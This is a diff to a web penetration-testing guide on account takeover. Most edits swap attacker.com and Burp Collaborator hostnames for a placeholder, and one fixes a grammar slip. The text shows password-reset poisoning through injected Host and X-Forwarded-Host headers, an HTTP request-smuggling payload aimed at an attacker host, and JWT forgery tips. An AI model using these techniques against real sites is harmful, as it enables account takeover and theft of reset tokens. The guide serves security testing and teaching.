@@ -33,17 +33,17 @@
 ### Account Takeover Through Password Reset Poisoning
 
 1. Intercept the password reset request in Burp Suite
-2. Add or edit the following headers in Burp Suite : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
+2. Add or edit the following headers in Burp Suite : `Host: [ATTACKER.DOMAIN.TLD]`, `X-Forwarded-Host: [ATTACKER.DOMAIN.TLD]`
 3. Forward the request with the modified header
 
     ```http
     POST https://example.com/reset.php HTTP/1.1
     Accept: */*
     Content-Type: application/json
-    Host: attacker.com
+    Host: [ATTACKER.DOMAIN.TLD]
     ```
 
-4. Look for a password reset URL based on the *host header* like : `https://attacker.com/reset-password.php?token=TOKEN`
+4. Look for a password reset URL based on the *host header* like : `https://[ATTACKER.DOMAIN.TLD]/reset-password.php?token=TOKEN`
 
 ### Password Reset via Email Parameter
 
@@ -142,7 +142,7 @@ Refer to **HTTP Request Smuggling** vulnerability page.
 2. Craft a request which will overwrite the `POST / HTTP/1.1` with the following data:
 
     ```powershell
-    GET http://something.burpcollaborator.net  HTTP/1.1
+    GET http://[ATTACKER.DOMAIN.TLD]  HTTP/1.1
     X: 
     ```
 
@@ -157,7 +157,7 @@ Refer to **HTTP Request Smuggling** vulnerability page.
 
     0
 
-    GET http://something.burpcollaborator.net  HTTP/1.1
+    GET http://[ATTACKER.DOMAIN.TLD]  HTTP/1.1
     X: X
     ```
 
@@ -173,7 +173,7 @@ Hackerone reports exploiting this bug
 
 ### Account Takeover via JWT
 
-JSON Web Token might be used to authenticate an user.
+JSON Web Token might be used to authenticate a user.
 
 * Edit the JWT with another User ID / Email
 * Check for weak JWT signature
